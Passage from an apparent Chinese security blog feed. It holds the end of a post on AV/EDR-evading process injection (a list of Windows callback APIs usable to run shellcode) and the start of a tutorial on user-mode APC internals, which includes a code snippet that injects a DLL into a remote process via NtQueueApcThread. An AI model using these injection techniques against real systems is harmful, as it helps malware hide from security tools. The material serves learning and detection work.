class="line">MgmLocalJoinCallback</span><br><span class="line">MgmLocalLeaveCallback</span><br><span class="line">MgmPruneAlertCallback</span><br><span class="line">MgmRpfCallback</span><br><span class="line">MgmWrongIfCallback</span><br><span class="line">MGM_ENABLE_IGMP_CALLBACK</span><br><span class="line">MibCreate</span><br><span class="line">MibDelete</span><br><span class="line">MIBEntryCreate</span><br><span class="line">MIBEntryDelete</span><br><span class="line">MIBEntryGet</span><br><span class="line">MIBEntryGetFirst</span><br><span class="line">MIBEntryGetNext</span><br><span class="line">MIBEntrySet</span><br><span class="line">MibGet</span><br><span class="line">MibGetFirst</span><br><span class="line">MibGetNext</span><br><span class="line">MibGetTrapInfo</span><br><span class="line">MibSet</span><br><span class="line">MibSetTrapInfo</span><br><span class="line">MidiInProc</span><br><span class="line">MidiOutProc</span><br><span class="line">MiniDumpCallback</span><br><span class="line">MMCFreeNotifyHandle</span><br><span class="line">MMCPropertyChangeNotify</span><br><span class="line">MMCPropertyHelp</span><br><span class="line">MMCPropPageCallback</span><br><span class="line">MMIOProc</span><br><span class="line">MonitorEnumProc</span><br><span class="line">MouseProc</span><br><span class="line">MRUCMPPROC</span><br><span class="line">MyStatusProc</span><br><span class="line">OFNHookProc</span><br><span class="line">OFNHookProcOldStyle</span><br><span class="line">OpenPerformanceData</span><br><span class="line">ORASADFunc</span><br><span class="line">OutOfProcessExceptionEventCallback</span><br><span class="line">OutOfProcessExceptionEventDebuggerLaunchCallback</span><br><span class="line">OutOfProcessExceptionEventSignatureCallback</span><br><span class="line">OutputProc</span><br><span class="line">PIO_APC_ROUTINE</span><br><span class="line">QueryPower</span><br><span class="line">RadiusExtensionFreeAttributes</span><br><span class="line">RadiusExtensionInit</span><br><span class="line">RadiusExtensionProcess</span><br><span class="line">RadiusExtensionProcess2</span><br><span class="line">RadiusExtensionProcessEx</span><br><span class="line">RadiusExtensionTerm</span><br><span class="line">RASADFunc</span><br><span class="line">RasAdminAcceptNewConnection</span><br><span class="line">RasAdminConnectionHangupNotification</span><br><span class="line">RasAdminGetIpAddressForUser</span><br><span class="line">RasAdminReleaseIpAddress</span><br><span class="line">RasCustomDeleteEntryNotify</span><br><span class="line">RasCustomDial</span><br><span class="line">RasCustomDialDlg</span><br><span class="line">RasCustomEntryDlg</span><br><span class="line">RasCustomHangUp</span><br><span class="line">RasCustomScriptExecute</span><br><span class="line">RasDialFunc</span><br><span class="line">RasDialFunc1</span><br><span class="line">RasDialFunc2</span><br><span class="line">RasEapBegin</span><br><span class="line">RasEapEnd</span><br><span class="line">RasEapFreeMemory</span><br><span class="line">RasEapGetIdentity</span><br><span class="line">RasEapGetInfo</span><br><span class="line">RasEapInitialize</span><br><span class="line">RasEapInvokeConfigUI</span><br><span class="line">RasEapInvokeInteractiveUI</span><br><span class="line">RasEapMakeMessage</span><br><span class="line">RasFreeBuffer</span><br><span class="line">RasGetBuffer</span><br><span class="line">RasPBDlgFunc</span><br><span class="line">RasReceiveBuffer</span><br><span class="line">RasRetrieveBuffer</span><br><span class="line">RasSecurityDialogBegin</span><br><span class="line">RasSecurityDialogEnd</span><br><span class="line">RasSendBuffer</span><br><span class="line">RasSetCommSettings</span><br><span class="line">ReaderScroll</span><br><span class="line">ReadProcessMemoryProc64</span><br><span class="line">RegisterApplicationRecoveryCallback</span><br><span class="line">RegisterCallback</span><br><span class="line">RegisterProtocol</span><br><span class="line">RegisterWaitChainCOMCallback</span><br><span class="line">RemoveAt</span><br><span class="line">RemoveSecureMemoryCacheCallback</span><br><span class="line">RemoveTraceCallback</span><br><span class="line">rintHookProc</span><br><span class="line">RM_WRITE_STATUS_CALLBACK</span><br><span class="line">rocessGroupPolicy</span><br><span class="line">rocessGroupPolicyEx</span><br><span class="line">rogressNotificationCallback</span><br><span class="line">ropEnumProc</span><br><span class="line">ropEnumProcEx</span><br><span class="line">ropSheetPageProc</span><br><span class="line">ropSheetProc</span><br><span class="line">RpcAuthKeyRetrievalFn</span><br><span class="line">RpcMgmtAuthorizationFn</span><br><span class="line">RpcnotificationRoutine</span><br><span class="line">RpcObjectInqFn</span><br><span class="line">RPC_IF_CALLBACK_FN</span><br><span class="line">RtlInstallFunctionTableCallback</span><br><span class="line">RTM_ENTITY_EXPORT_METHOD</span><br><span class="line">RTM_EVENT_CALLBACK</span><br><span class="line">SampleCommand</span><br><span class="line">SampleCommit</span><br><span class="line">SampleConnect</span><br><span class="line">SampleDump</span><br><span class="line">SampleOsVersionCheck</span><br><span class="line">SampleStartHelper</span><br><span class="line">SampleStop</span><br><span class="line">SampleStopHelper</span><br><span class="line">SceSvcAttachmentAnalyze</span><br><span class="line">SceSvcAttachmentConfig</span><br><span class="line">SceSvcAttachmentUpdate</span><br><span class="line">SecureMemoryCacheCallback</span><br><span class="line">SendAsyncProc</span><br><span class="line">SendMessageCallback</span><br><span class="line">ServiceMain</span><br><span class="line">SetAt</span><br><span class="line">SetGlobalInfo</span><br><span class="line">SetInterfaceInfo</span><br><span class="line">SetInterfaceReceiveType</span><br><span class="line">SetLineRecoCallback</span><br><span class="line">SetPower</span><br><span class="line">SetProviderStatusFunc</span><br><span class="line">SetProviderStatusInfoFreeFunc</span><br><span class="line">SetResponseType</span><br><span class="line">SetTraceCallback</span><br><span class="line">SetupDefaultQueueCallback</span><br><span class="line">SetupHookProc</span><br><span class="line">SetupInitDefaultQueueCallback</span><br><span class="line">SetupTermDefaultQueueCallback</span><br><span class="line">ShellProc</span><br><span class="line">ShutdownEmbeddedUI</span><br><span class="line">SimpleCallback</span><br><span class="line">SNMPAPI_CALLBACK</span><br><span class="line">SnmpExtensionClose</span><br><span class="line">SnmpExtensionInit</span><br><span class="line">SnmpExtensionInitEx</span><br><span class="line">SnmpExtensionMonitor</span><br><span class="line">SnmpExtensionQuery</span><br><span class="line">SnmpExtensionQueryEx</span><br><span class="line">SnmpExtensionTrap</span><br><span class="line">SoundSentryProc</span><br><span class="line">SP_FILE_CALLBACK</span><br><span class="line">StackSnapshotCallback</span><br><span class="line">StartComplete</span><br><span class="line">StartProtocol</span><br><span class="line">StatusCallback</span><br><span class="line">StatusMessageCallback</span><br><span class="line">StatusRoutine</span><br><span class="line">StopProtocol</span><br><span class="line">SymEnumerateModulesProc64</span><br><span class="line">SymEnumerateSymbolsProc64</span><br><span class="line">SymEnumLinesProc</span><br><span class="line">SymEnumProcessesProc</span><br><span class="line">SymEnumSourceFilesProc</span><br><span class="line">SymEnumSourceFileTokensProc</span><br><span class="line">SymEnumSymbolsProc</span><br><span class="line">SymFindFileInPathProc</span><br><span class="line">SymRegisterCallback</span><br><span class="line">SymRegisterCallbackProc64</span><br><span class="line">SymRegisterFunctionEntryCallback</span><br><span class="line">SymRegisterFunctionEntryCallbackProc64</span><br><span class="line">SyncUpdateProc</span><br><span class="line">SysMsgProc</span><br><span class="line">TaskDialogCallbackProc</span><br><span class="line">ThreadProc</span><br><span class="line">TimeProc</span><br><span class="line">TimeProvClose</span><br><span class="line">TimeProvCommand</span><br><span class="line">TimeProvOpen</span><br><span class="line">TimerAPCProc</span><br><span class="line">TimerCallback</span><br><span class="line">TimerProc</span><br><span class="line">TranslateAddressProc64</span><br><span class="line">TranslateDispatch</span><br><span class="line">TrySubmitThreadpoolCallback</span><br><span class="line">UiaEventCallback</span><br><span class="line">UiaProviderCallback</span><br><span class="line">UiaRegisterProviderCallback</span><br><span class="line">UmsSchedulerProc</span><br><span class="line">UnbindInterface</span><br><span class="line">UndeleteFile</span><br><span class="line">UnregisterApplicationRecoveryCallback</span><br><span class="line">ValidateRoute</span><br><span class="line">VectoredHandler</span><br><span class="line">VERIFYSERVERCERT</span><br><span class="line">WaitCallback</span><br><span class="line">WaitChainCallback</span><br><span class="line">WaitOrTimerCallback</span><br><span class="line">waveInProc</span><br><span class="line">waveOutProc</span><br><span class="line">WdsTransportClientRegisterCallback</span><br><span class="line">WdsTransportProviderCloseContent</span><br><span class="line">WdsTransportProviderCloseInstance</span><br><span class="line">WdsTransportProviderCompareContent</span><br><span class="line">WdsTransportProviderCreateInstance</span><br><span class="line">WdsTransportProviderDumpState</span><br><span class="line">WdsTransportProviderGetContentMetadata</span><br><span class="line">WdsTransportProviderGetContentSize</span><br><span class="line">WdsTransportProviderInitialize</span><br><span class="line">WdsTransportProviderOpenContent</span><br><span class="line">WdsTransportProviderReadContent</span><br><span class="line">WdsTransportProviderRefreshSettings</span><br><span class="line">WdsTransportProviderShutdown</span><br><span class="line">WdsTransportProviderUserAccessCheck</span><br><span class="line">WdsTransportServerRegisterCallback</span><br><span class="line">WinBioCaptureSampleWithCallback</span><br><span class="line">WinBioEnrollCaptureWithCallback</span><br><span class="line">WinBioIdentifyWithCallback</span><br><span class="line">WinBioLocateSensorWithCallback</span><br><span class="line">WinBioVerifyWithCallback</span><br><span class="line">WindowProc</span><br><span class="line">WinEventProc</span><br><span class="line">WinHttpSetStatusCallback</span><br><span class="line">WINHTTP_STATUS_CALLBACK</span><br><span class="line">WLAN_NOTIFICATION_CALLBACK</span><br><span class="line">WorkCallback</span><br><span class="line">WPUQueryBlockingCallback</span><br><span class="line">xeProviderInitialize</span><br><span class="line">xeProviderRecvRequest</span><br><span class="line">xeProviderServiceControl</span><br><span class="line">xeProviderShutdown</span><br><span class="line">xeRegisterCallback</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.hexacorn.com/blog/2016/12/17/shellcode-ill-call-you-back/">https://www.hexacorn.com/blog/2016/12/17/shellcode-ill-call-you-back/</a><br><a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/">https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;进程注入是攻击方武器库中最重要的技术之一，本文将会介绍如何使用线程描述相关的API实现绕过AV/EDR的进程注入，最后会提供相应的检测方式。</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>APC系列之用户模式APC</title>
    <link href="http://example.com/2025/10/07/APC%E7%B3%BB%E5%88%97%E4%B9%8B%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8FAPC/"/>
    <id>http://example.com/2025/10/07/APC%E7%B3%BB%E5%88%97%E4%B9%8B%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8FAPC/</id>
    <published>2025-10-07T15:14:47.000Z</published>
    <updated>2025-10-09T14:25:07.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个系列的目的是希望你能系统的理解APC的内部原理（不再是零散的理解）</p><p>我重构了用户模式和内核模式下APC相关的函数，希望更好的理解APC机制，在文章的最后会分享源码</p><p>在这个系列中，我将探讨下面的主题<br>1、用户模式下APC的使用<br>2、内核模式下APC的使用<br>3、用户模式下APC内部原理<br>4、内核模式下APC内部原理<br>5、“Alerts”的概念以及它和APC的关系<br>6、APC在Wow64中的应用<br>7、如何在用户模式和内核模式下干扰微软对APC的ETW监控<br>8、如何使用APC安全的卸载一个驱动程序<br>9、像Procmon和Process Hacker这类安全工具如何利用APC<br>10、CET（用于检测ROP的CPU Shadow Stack）如何影响APC<br>11、关于APC机制有文档的源代码<br>12、关于APC的逆向工程练习<br>13、接下来文章中的惊喜</p><p>本文是系列的第一篇文章，讲述用户模式下APC，是这个系列中相对简单的部分，文中我将一边讲解，一边分享代码</p><h1 id="APC介绍"><a href="#APC介绍" class="headerlink" title="APC介绍"></a>APC介绍</h1><p>APC全称Asynchronous Procedure Call，译为“异步过程调用”，是Windows中使用的一种机制，这种机制的核心是一个队列，通常称为APC队列，每个线程有2个APC队列：一个是用户模式APC队列、一个是内核模式APC队列，可以利用这种机制将函数放到指定线程的队列中，安全人员了解APC主要因为它被用在恶意软件中，用于执行代码或将代码注入到远程进程中，本质上是对APC机制的滥用。</p><p>好多初学者对异步很模糊，异步简单来说就是：当前执行的任务A不用等待任务B完成，就可以继续执行，相对应的，同步指的是当前执行的任务A需要任务B完成，才能继续</p><p>最好不要在内核模式使用APC，因为内核模式下APC的使用是没有官方文档的，那意味着一点差错都可能导致系统崩溃等问题，但是安全人员往往从内核模式使用APC，用来注入代码到用户模式进程中（比如反病毒软件、Rookits、等），如果你不是完全清楚你在做什么的话（即使你是一个超级专家，认为Windows不会影响你的代码），我不推荐你在内核模式下使用APC以及任何无官方文档的机制，然而如果你知道你在做什么，在某些情况下使用APC是相对安全的，关于内核模式下APC会在后续的文章中讲述</p><p>APC的应用例如，你调用一个异步的RPC方法，当RPC方法完成时，你指定的APC例程将被执行，再比如NtWriteFile/NtReadFile、Get/SetThreadContext、SuspendThread、TerminateThread、等等都用到了APC，甚至Windows调度程序也使用了APC，这也是为什么我觉得理解APC对理解Windows内部原理至关重要（尽管微软宣称这是一个无官方文档的功能，人们应该忽视它）</p><p>用户模式下APC有2种：</p><ul><li>普通用户模式APC：仅当目标线程处于警报状态时，才会执行我们通过APC插入的函数（或者特定情况下，后面会提到）</li><li>特殊用户模式APC：在Windows 10 RS5中添加的相对新的API（也是无官方文档的）</li></ul><p>用户模式下APC的API如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD QueueUserAPC(</span><br><span class="line">    PAPCFUNC pfnAPC,</span><br><span class="line">    HANDLE hThread,</span><br><span class="line">    ULONG_PTR dwData</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="Alertable"><a href="#Alertable" class="headerlink" title="Alertable"></a>Alertable</h1><p>Alertable译为警报状态，恶意软件使用用户模式APC的主要问题之一是，目标线程必须处于警报状态，才能执行恶意软件插入到目标线程中的APC函数，一个线程在调用带有”等候”特性的函数时，将进入警报状态，例如WaitForSingleObjectEx、SleepEx、等等，并且bAlertable的值为TRUE，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD WaitForSingleObjectEx(</span><br><span class="line">  [in] HANDLE hHandle,</span><br><span class="line">  [in] DWORD  dwMilliseconds,</span><br><span class="line">  [in] BOOL   bAlertable</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD SleepEx(</span><br><span class="line">  [in] DWORD dwMilliseconds,</span><br><span class="line">  [in] BOOL  bAlertable</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>APC具体的执行时机是，当调用SleepEx时，SleepEx执行期间会有一个等待状态，这个等待状态期间，会检查APC队列，如果有函数，就会执行，另外一个能让APC队列中函数执行的方式是NtTestAlert，我们会在后面讲述</p><p>微软不想强制用户模式下的线程执行APC，因为那可能会导致微妙的条件竞争和死锁（我猜测的），假设你写的程序中有一个被特定锁保护的列表，你的程序中使用了RPC和APC，当线程获取了锁，想要对列表进行操作，这时一个APC被强制运行在这个线程中，然后APC中的代码尝试获取锁，于是死锁产生了，但如果被插入的APC仅在线程处于警报状态时执行，这会大大改善这种情况发生的概率</p><p>在APC内部获取锁不是一个好想法，但在内核态，微软解决了一部分问题，你可以阻止一个线程的APC获取某个锁通过将IRQL提升到APC_LEVEL，或者通过KeEnterCriticalRegion/KeEnterGuardedRegion关闭APC，这在某些情况下是需要的，例如调用ExAcquireResourceSharedLite时，我将在内核模式APC中详细讨论</p><p>此外，微软对用户模式APC有一些建议：</p><ul><li>不要在APC内部进入警报状态</li><li>不要在远程进程的APC队列中添加函数，因为不同进程中的函数地址、重定位表均不同，还涉及Wow64<br>我既不同意也不反对这些建议，但是想要用好APC机制，就需要深刻理解它并知道如何使用它</li></ul><h1 id="APC用于注入"><a href="#APC用于注入" class="headerlink" title="APC用于注入"></a>APC用于注入</h1><p>如果你想在用户模式下使用APC进行注入，你必须找到一个可警报的线程或者希望线程自己进入警报状态，但是在Windows 10 RS5中，微软实现了一个有趣的机制：特殊用户APC，这种机制允许目标线程强制执行我们在APC队列中插入的函数（即使目标线程不是警报状态），原理是通过内核模式APC队列发出信号，触发用户模式下线程的APC函数执行</p><p>我们从API视角探讨一下这些APC的不同，假如有2个进程，合法的和恶意的，恶意进程想通过APC将代码注入到合法进程，合法进程只有一个线程，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">    while (1) &#123;</span><br><span class="line">        Sleep(500);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果注入器使用普通用户APC函数插入函数到目标线程，插入的代码永远不会执行，无需惊讶，因为线程不会进入警报状态，插入的代码位于目标线程的APC队列，但不会执行，直到线程终止，APC队列被释放</p><p>特殊用户APC这个机制在Windows 10 RS5中被添加（Native API是NtQueueApcThreadEx，位于ntdll.dll中，后面改为NtQueueApcThreadEx2，这是一个新的syscall），如果这类APC被调用，则在线程执行过程中对其发出信号，让它执行特殊用户APC</p><p>这对攻击者是很有吸引力的，但实际上用起来很危险，假设一个线程调用LoadLibrary期间，攻击者调用特殊用户APC想要将自己的代码加入到目标线程APC队列中，已知LoadLibrary会修改PEB中加载器的结构以及获取一些锁，攻击者自己的代码也是LoadLibrary，这会造成问题，因为目标线程中已经有了LoadLibrary（这也是为什么微软不想你在线程没有处于警报状态时运行APC队列中的函数），这种情况下线程会卡住或者PEB中加载器的数据结构被异常修改，这个问题听起来很少见，但实际上很危险，因为不只是LoadLibrary使用锁，其他好多函数都会用到锁，不过，特殊用户APC对于攻击者还是很有用的</p><p>通常，想要正确使用APC需要你对目标线程有一定了解</p><h1 id="探索API"><a href="#探索API" class="headerlink" title="探索API"></a>探索API</h1><p>让我们从底层开始，内核提供了3个和APC相关的API：NtQueueApcThread、NtQueueApcThreadEx、NtQueueApcThreadEx2，其中QueueUserAPC是NtQueueApcThread的上层函数，QueueUserAPC2是NtQueueApcThreadEx和NtQueueApcThreadEx2的上层函数，均位于KernelBase.dll中，我们看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// ThreadHandle - 线程句柄，必须拥有THREAD_SET_CONTEXT权限，可以是不同进程下线程的句柄（尽管微软不推荐使用不同进程下线程句柄）</span><br><span class="line">//</span><br><span class="line">// ApcRoutine - 要执行的函数</span><br><span class="line">//</span><br><span class="line">// SystemArgument1-3 - ApcRoutine的前三个参数  </span><br><span class="line">//</span><br><span class="line">//</span><br><span class="line">NTSTATUS</span><br><span class="line">NtQueueApcThread(  </span><br><span class="line">    IN HANDLE ThreadHandle,</span><br><span class="line">    IN PPS_APC_ROUTINE ApcRoutine,</span><br><span class="line">    IN PVOID SystemArgument1 OPTIONAL,</span><br><span class="line">    IN PVOID SystemArgument2 OPTIONAL,</span><br><span class="line">    IN PVOID SystemArgument3 OPTIONAL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef VOID (*PPS_APC_ROUTINE)(</span><br><span class="line">    PVOID SystemArgument1,</span><br><span class="line">    PVOID SystemArgument2,</span><br><span class="line">    PVOID SystemArgument3,</span><br><span class="line">    PCONTEXT ContextRecord</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这个API的用法很简单，我们看一下使用示例（出于简化考虑，移除了错误处理）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">VOID QueueLoadLibrary(ULONG ProcessId, PSTR LibraryName) &#123;</span><br><span class="line">    PVOID RemoteLibraryAddress;</span><br><span class="line">    HANDLE ProcessHandle;</span><br><span class="line">    HANDLE ThreadHandle;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    </span><br><span class="line">    //</span><br><span class="line">    // 使用需要的权限打开进程，用来分配和写入库名</span><br><span class="line">    //</span><br><span class="line">    ProcessHandle = OpenProcess(</span><br><span class="line">                        PROCESS_QUERY_INFORMATION |</span><br><span class="line">                        PROCESS_VM_OPERATION |</span><br><span class="line">                        PROCESS_VM_WRITE,</span><br><span class="line">                        FALSE,</span><br><span class="line">                        ProcessId</span><br><span class="line">                    );</span><br><span class="line"></span><br><span class="line">RemoteLibraryAddress = WriteLibraryNameToRemote(ProcessHandle, LibraryName);</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // 在进程中获取第一个线程的句柄</span><br><span class="line">    //</span><br><span class="line">    NtGetNextThread(</span><br><span class="line">        ProcessHandle,</span><br><span class="line">        NULL,</span><br><span class="line">        THREAD_SET_CONTEXT,</span><br><span class="line">        0,</span><br><span class="line">        0,</span><br><span class="line">        &amp;ThreadHandle</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    NtQueueApcThread(</span><br><span class="line">        ThreadHandle,</span><br><span class="line">        GetProcAddress(GetModuleHandle(&quot;kernel32&quot;), &quot;LoadLibraryA&quot;),</span><br><span class="line">        RemoteLibraryAddress,</span><br><span class="line">        NULL,</span><br><span class="line">        NULL</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用法很简单，查看注释就能理解，可以看到LoadLibraryA的函数原型不是PPS_APC_ROUTINE，但在x64系统中没关系</p><h1 id="QueueUserAPC：KernelBase-dll层"><a href="#QueueUserAPC：KernelBase-dll层" class="headerlink" title="QueueUserAPC：KernelBase.dll层"></a>QueueUserAPC：KernelBase.dll层</h1><p>微软喜欢为系统调用创建“包装器”，这个“包装器”就是指上层函数，以至于他们可以改变内部实现而不影响上层函数，微软也喜欢COM和DLL的载入和重定向机制，上述的结合造就了QueueUserAPC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// This is the wrapper function implemented in kernelbase.dll to queue APCs. This function is documented.</span><br><span class="line">// This function has 3 arguments:</span><br><span class="line">//</span><br><span class="line">// pfnAPC - the pointer to the apc routine in the target process context. </span><br><span class="line">//          Note that the signature of this function is different from the signature in NtQueueApcThread.</span><br><span class="line">//</span><br><span class="line">// hThread - the handle to the target thread. Requires THREAD_SET_CONTEXT.</span><br><span class="line">//</span><br><span class="line">// dwData - the context argument passed to pfnAPC - This is the only argument passed to pfnAPC.</span><br><span class="line">//</span><br><span class="line">DWORD </span><br><span class="line">QueueUserAPC(</span><br><span class="line">    PAPCFUNC pfnAPC,</span><br><span class="line">    HANDLE hThread,</span><br><span class="line">    ULONG_PTR dwData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// This is the signature of the APC Routine if QueueUserAPC is used. </span><br><span class="line">// The only parameter here is the dwData argument from QueueUserAPC.</span><br><span class="line">// You may ask why the signature is different than the signature of PPS_APC_ROUTINE, we&#x27;ll see below why.</span><br><span class="line">//</span><br><span class="line">typedef</span><br><span class="line">VOID</span><br><span class="line">(NTAPI *PAPCFUNC)(</span><br><span class="line">    IN ULONG_PTR Parameter</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// This is the reverse engineered implementation of QueueUserAPC in windows 10 </span><br><span class="line">// (In was changed a bit in the latest insider, you&#x27;ll see below)</span><br><span class="line">// </span><br><span class="line">// This function captures the activation context of the current thread </span><br><span class="line">// and saves it, so it can be inherited by the APC routine.</span><br><span class="line">//</span><br><span class="line">// Activation Contexts are data structures that save configuration for DLL redirection, SxS and COM.</span><br><span class="line">// To read more about activation context: https://docs.microsoft.com/en-us/windows/win32/sbscs/activation-contexts.</span><br><span class="line">//</span><br><span class="line">DWORD </span><br><span class="line">QueueUserAPC(</span><br><span class="line">    PAPCFUNC pfnAPC,</span><br><span class="line">    HANDLE hThread,</span><br><span class="line">    ULONG_PTR dwData</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    ACTIVATION_CONTEXT_BASIC_INFORMATION Info;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // 捕获激活上下文，激活上下文指DLL重定向、SxS、COM等配置，并传递给APC队列中的函数</span><br><span class="line">    //</span><br><span class="line">    Status = RtlQueryInformationActivationContext(</span><br><span class="line">            1,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            ActivationContextBasicInformation,</span><br><span class="line">            &amp;Info,</span><br><span class="line">            sizeof(Info),</span><br><span class="line">            NULL</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    if (!NT_SUCCESS(Status)) 